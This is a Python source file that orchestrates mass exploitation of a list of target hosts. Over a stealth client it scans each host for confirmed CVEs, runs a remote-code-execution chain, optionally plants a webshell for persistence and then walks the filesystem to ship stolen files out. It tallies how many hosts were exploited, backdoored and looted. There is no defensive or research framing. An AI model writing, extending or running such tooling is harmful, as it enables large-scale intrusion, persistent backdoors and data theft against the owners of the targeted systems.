# Python 3.11 · mass exploitation orchestrator
from __future__ import annotations

import asyncio
from dataclasses import dataclass, field
from pathlib import Path

from ...scanner import Scanner
from ...stealth import Stealth
from ...exploit.rce import RCEChain
from .state import StateStore, TargetState


@dataclass
class MassConfig:
    targets: list[str]
    concurrency: int = 8
    safe: bool = True
    persist: bool = False
    exfil: bool = False
    output_dir: Path = Path("./mass-out")
    stealth: Stealth = field(default_factory=Stealth)


class Orchestrator:
    def __init__(self, cfg: MassConfig) -> None:
        self.cfg = cfg
        self.store = StateStore(cfg.output_dir / "state.sqlite")
        self.scanner = Scanner(safe=cfg.safe, concurrency=cfg.concurrency, stealth=cfg.stealth)

    async def run(self) -> dict:
        self.cfg.output_dir.mkdir(parents=True, exist_ok=True)
        sem = asyncio.Semaphore(self.cfg.concurrency)
        tally = {"scanned": 0, "confirmed": 0, "exploited": 0, "persisted": 0, "exfiltrated": 0}

        async def one(target: str) -> None:
            async with sem:
                state = self.store.get_or_create(target)
                if state.phase == "done":
                    return
                try:
                    await self._drive(target, state, tally)
                    state.phase = "done"
                except Exception as e:
                    state.phase = "error"
                    state.last_error = repr(e)
                finally:
                    self.store.save(state)

        await asyncio.gather(*(one(t) for t in self.cfg.targets))
        return tally

    async def _drive(self, target: str, state: TargetState, tally: dict) -> None:
        results = await self.scanner.scan([target])
        tally["scanned"] += 1
        if not results or not results[0].confident:
            state.phase = "not-vulnerable"
            return
        state.phase = "confirmed"
        state.cves = results[0].confident
        tally["confirmed"] += 1

        client = self.cfg.stealth.client()
        try:
            chain = RCEChain(client, target)
            ok, out = await chain.execute("id")
            if not ok:
                state.phase = "exploit-failed"
                state.last_error = out
                return
            state.phase = "exploited"
            state.whoami = out.strip()
            tally["exploited"] += 1

            if self.cfg.persist:
                from ..persist.webshell import drop_shell
                state.shell_url = await drop_shell(client, target)
                tally["persisted"] += 1

            if self.cfg.exfil and state.shell_url:
                from ..exfil.walker import walk_and_ship
                shipped = await walk_and_ship(
                    client, state.shell_url,
                    self.cfg.output_dir / target.replace("/", "_").replace(":", "_"),
                )
                state.exfil_files = shipped
                tally["exfiltrated"] += len(shipped)
        finally:
            await client.aclose()